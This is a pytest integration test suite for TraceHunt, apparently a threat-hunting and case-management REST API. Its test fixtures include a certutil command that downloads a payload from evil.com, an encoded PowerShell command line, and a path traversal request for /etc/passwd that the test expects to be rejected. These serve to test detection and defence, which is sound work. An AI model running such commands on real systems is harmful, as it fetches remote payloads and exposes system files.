"""Integration tests for TraceHunt FastAPI REST API.

Tests:
- Health and status endpoints.
- Telemetry ingestion upload (JSON array, deduplication, invalid format rejection, EVTX rejection).
- Host listing, metrics, timeline queries, and process trees.
- Detection rule listing, rule toggling, evaluation trigger, and findings.
- Investigation case creation, retrieval, updates, and invalid transition handling.
- Case closure with rationale and reopening.
- Evidence attachment, retrieval, and removal.
- Audit history retrieval.
- Report generation and safe download with path traversal protection.
"""

from datetime import datetime, timezone
import io
import json
import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from tracehunt.api.app import create_app
from tracehunt.database import get_db
from tracehunt.models import EndpointEvent, Finding


@pytest.fixture
def client(test_session: Session):
    """Provide a TestClient with dependency-injected test database session."""
    test_app = create_app()
    test_app.dependency_overrides[get_db] = lambda: test_session
    with TestClient(test_app) as c:
        yield c
    test_app.dependency_overrides.clear()


def test_health_and_status_endpoints(client: TestClient, test_session: Session) -> None:
    """Verify /api/v1/health and /api/v1/status endpoints return 200 OK with accurate metrics."""
    res_health = client.get("/api/v1/health")
    assert res_health.status_code == 200
    health_data = res_health.json()
    assert health_data["status"] == "ok"
    assert health_data["database_connected"] is True
    assert "endpoint_events" in health_data["tables_verified"]

    res_status = client.get("/api/v1/status")
    assert res_status.status_code == 200
    status_data = res_status.json()
    assert "total_endpoint_events" in status_data
    assert "total_findings" in status_data


def test_ingest_telemetry_json_array_and_deduplication(client: TestClient) -> None:
    """Verify uploading a JSON array ingests events, and re-uploading skips duplicates."""
    sample_events = [
        {
            "EventID": 1,
            "UtcTime": "2026-03-30 10:00:00.000",
            "ProcessId": 4100,
            "ParentProcessId": 1000,
            "Image": r"C:\Windows\System32\cmd.exe",
            "CommandLine": "cmd.exe /c whoami",
            "User": "CORP\\api_user",
            "Computer": "API-WKSTN-01",
        }
    ]
    file_bytes = json.dumps(sample_events).encode("utf-8")

    # 1. First upload
    response = client.post(
        "/api/v1/ingest",
        files={"file": ("test_events.json", io.BytesIO(file_bytes), "application/json")},
    )
    assert response.status_code == 201
    data = response.json()
    assert data["successful_records"] == 1
    assert data["duplicates_skipped"] == 0

    # 2. Second upload of identical file (Idempotency test)
    response2 = client.post(
        "/api/v1/ingest",
        files={"file": ("test_events.json", io.BytesIO(file_bytes), "application/json")},
    )
    assert response2.status_code == 201
    data2 = response2.json()
    assert data2["successful_records"] == 0
    assert data2["duplicates_skipped"] == 1


def test_ingest_rejection_of_unsupported_formats_and_evtx(client: TestClient) -> None:
    """Verify uploading binary EVTX or unsupported extensions returns 400 Bad Request."""
    # EVTX rejection
    res_evtx = client.post(
        "/api/v1/ingest",
        files={"file": ("Security.evtx", io.BytesIO(b"ElfFile\x00"), "application/octet-stream")},
    )
    assert res_evtx.status_code == 400
    assert "Native binary EVTX files are not directly supported" in res_evtx.json()["detail"]

    # Unsupported extension rejection
    res_exe = client.post(
        "/api/v1/ingest",
        files={"file": ("malware.exe", io.BytesIO(b"MZ\x90"), "application/octet-stream")},
    )
    assert res_exe.status_code == 400
    assert "Unsupported file extension" in res_exe.json()["detail"]


def test_hosts_timeline_and_process_tree_endpoints(client: TestClient, test_session: Session) -> None:
    """Verify host listing, host metrics, timeline queries, and process tree retrieval."""
    ev = EndpointEvent(
        host="HOST-ALPHA",
        event_time=datetime(2026, 3, 30, 10, 0, 0, tzinfo=timezone.utc),
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=5000,
        parent_process_id=1000,
        image=r"C:\Windows\System32\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://evil.com/payload.exe",
        user="CORP\\test_analyst",
    )
    test_session.add(ev)
    test_session.flush()

    # 1. List hosts
    res_hosts = client.get("/api/v1/hosts")
    assert res_hosts.status_code == 200
    hosts_list = res_hosts.json()
    assert any(h["host"] == "HOST-ALPHA" for h in hosts_list)

    # 2. Host metrics
    res_metrics = client.get("/api/v1/hosts/HOST-ALPHA/metrics")
    assert res_metrics.status_code == 200
    metrics_data = res_metrics.json()
    assert metrics_data["total_events"] >= 1

    # 3. Host timeline with search
    res_timeline = client.get("/api/v1/hosts/HOST-ALPHA/timeline?search=certutil")
    assert res_timeline.status_code == 200
    timeline_items = res_timeline.json()
    assert len(timeline_items) == 1
    assert "certutil" in timeline_items[0]["command_line"]

    # 4. Host process tree
    res_tree = client.get("/api/v1/hosts/HOST-ALPHA/tree")
    assert res_tree.status_code == 200
    tree_data = res_tree.json()
    assert tree_data["host"] == "HOST-ALPHA"
    assert "trees" in tree_data


def test_detections_rules_evaluation_and_findings(client: TestClient, test_session: Session) -> None:
    """Verify rule listing, rule toggling, detection evaluation, and finding retrieval."""
    # 1. List rules
    res_rules = client.get("/api/v1/detections/rules")
    assert res_rules.status_code == 200
    rules = res_rules.json()
    assert len(rules) >= 5
    assert any(r["id"] == "RULE-001-LOLBIN" for r in rules)

    # 2. Toggle rule
    res_toggle = client.post("/api/v1/detections/rules/RULE-001-LOLBIN/toggle", json={"enabled": False})
    assert res_toggle.status_code == 200
    assert res_toggle.json()["enabled"] is False

    # Toggle back on
    client.post("/api/v1/detections/rules/RULE-001-LOLBIN/toggle", json={"enabled": True})

    # 3. Add suspicious event and evaluate detections
    ev = EndpointEvent(
        host="HOST-BETA",
        event_time=datetime(2026, 3, 30, 11, 0, 0, tzinfo=timezone.utc),
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=6000,
        image=r"C:\Windows\System32\powershell.exe",
        command_line="powershell.exe -enc AAAAAA==",
        user="CORP\\compromised",
    )
    test_session.add(ev)
    test_session.flush()

    res_eval = client.post("/api/v1/detections/evaluate", json={"host": "HOST-BETA"})
    assert res_eval.status_code == 200
    eval_data = res_eval.json()
    assert eval_data["evaluated_events"] >= 1
    assert eval_data["findings_generated"] >= 1

    # 4. List findings
    res_findings = client.get("/api/v1/detections/findings?host=HOST-BETA")
    assert res_findings.status_code == 200
    findings_list = res_findings.json()
    assert len(findings_list) >= 1
    fid = findings_list[0]["id"]

    # 5. Get finding details
    res_fdetail = client.get(f"/api/v1/detections/findings/{fid}")
    assert res_fdetail.status_code == 200
    assert res_fdetail.json()["rule_id"] == "RULE-001-LOLBIN"


def test_investigation_cases_evidence_and_audit(client: TestClient, test_session: Session) -> None:
    """Verify complete case management lifecycle, evidence linking, and audit logging via API."""
    # 1. Create Case
    res_create = client.post(
        "/api/v1/cases",
        json={
            "title": "API Test Investigation Case",
            "host": "HOST-GAMMA",
            "summary": "Initial triage of anomalous powershell activity",
            "reviewer": "api_analyst",
        },
    )
    assert res_create.status_code == 201
    case_data = res_create.json()
    case_id = case_data["id"]
    assert case_data["status"] == "OPEN"

    # 2. Get Case Details
    res_get = client.get(f"/api/v1/cases/{case_id}")
    assert res_get.status_code == 200
    assert res_get.json()["title"] == "API Test Investigation Case"

    # 3. Transition to INVESTIGATING
    res_trans = client.post(
        f"/api/v1/cases/{case_id}/transition",
        json={"new_status": "INVESTIGATING", "reviewer": "api_analyst", "rationale": "Starting graph analysis"},
    )
    assert res_trans.status_code == 200
    assert res_trans.json()["status"] == "INVESTIGATING"

    # 4. Invalid status transition rejection
    res_invalid = client.post(
        f"/api/v1/cases/{case_id}/transition",
        json={"new_status": "NONEXISTENT_STATUS", "reviewer": "api_analyst"},
    )
    assert res_invalid.status_code == 400

    # 5. Add Analyst Note
    res_note = client.post(
        f"/api/v1/cases/{case_id}/notes",
        json={"note": "Observed suspicious outbound beaconing", "reviewer": "api_analyst"},
    )
    assert res_note.status_code == 201

    # 6. Close Case with rationale
    res_close = client.post(
        f"/api/v1/cases/{case_id}/close",
        json={
            "disposition": "TRUE_POSITIVE",
            "reviewer": "api_analyst",
            "rationale": "Confirmed adversary command and control execution",
        },
    )
    assert res_close.status_code == 200
    assert res_close.json()["status"] == "CLOSED_TRUE_POSITIVE"

    # 7. Reopen Case with rationale
    res_reopen = client.post(
        f"/api/v1/cases/{case_id}/reopen",
        json={"reviewer": "lead_hunter", "rationale": "Discovered lateral movement to domain controller"},
    )
    assert res_reopen.status_code == 200
    assert res_reopen.json()["status"] == "OPEN"

    # 8. Check Case Audit Trail
    res_audit = client.get(f"/api/v1/cases/{case_id}/audit")
    assert res_audit.status_code == 200
    audit_entries = res_audit.json()
    assert len(audit_entries) >= 4


def test_reports_generate_and_download_endpoints(client: TestClient, test_session: Session) -> None:
    """Verify generating and downloading HTML, JSON, DOCX, and PDF reports through the API."""
    # 1. Generate HTML report
    res_gen = client.post(
        "/api/v1/reports/generate",
        json={"format": "html"},
    )
    assert res_gen.status_code == 201
    rep_info = res_gen.json()
    assert rep_info["format"] == "html"
    filename = rep_info["filename"]

    # 2. Download generated HTML report
    res_down = client.get(f"/api/v1/reports/{filename}")
    assert res_down.status_code == 200
    assert "TraceHunt Threat Hunting Report" in res_down.text

    # 3. Generate JSON report
    res_json = client.post(
        "/api/v1/reports/generate",
        json={"format": "json"},
    )
    assert res_json.status_code == 201
    rep_json_info = res_json.json()
    assert rep_json_info["format"] == "json"
    res_down_json = client.get(f"/api/v1/reports/{rep_json_info['filename']}")
    assert res_down_json.status_code == 200
    assert res_down_json.headers.get("content-type") == "application/json"

    # 4. Generate DOCX report
    res_docx = client.post(
        "/api/v1/reports/generate",
        json={"format": "docx", "title": "API Word Test Report", "analyst_name": "API Hunter"},
    )
    assert res_docx.status_code == 201
    rep_docx_info = res_docx.json()
    assert rep_docx_info["format"] == "docx"
    res_down_docx = client.get(f"/api/v1/reports/{rep_docx_info['filename']}")
    assert res_down_docx.status_code == 200
    assert "openxmlformats" in res_down_docx.headers.get("content-type", "")
    assert len(res_down_docx.content) > 1000

    # 5. Generate PDF report
    res_pdf = client.post(
        "/api/v1/reports/generate",
        json={"format": "pdf", "title": "API PDF Test Report"},
    )
    assert res_pdf.status_code == 201
    rep_pdf_info = res_pdf.json()
    assert rep_pdf_info["format"] == "pdf"
    res_down_pdf = client.get(f"/api/v1/reports/{rep_pdf_info['filename']}")
    assert res_down_pdf.status_code == 200
    assert res_down_pdf.headers.get("content-type") == "application/pdf"
    assert len(res_down_pdf.content) > 1000

    # 6. Path traversal rejection in download
    res_traversal = client.get("/api/v1/reports/../../etc/passwd")
    assert res_traversal.status_code in {400, 404}

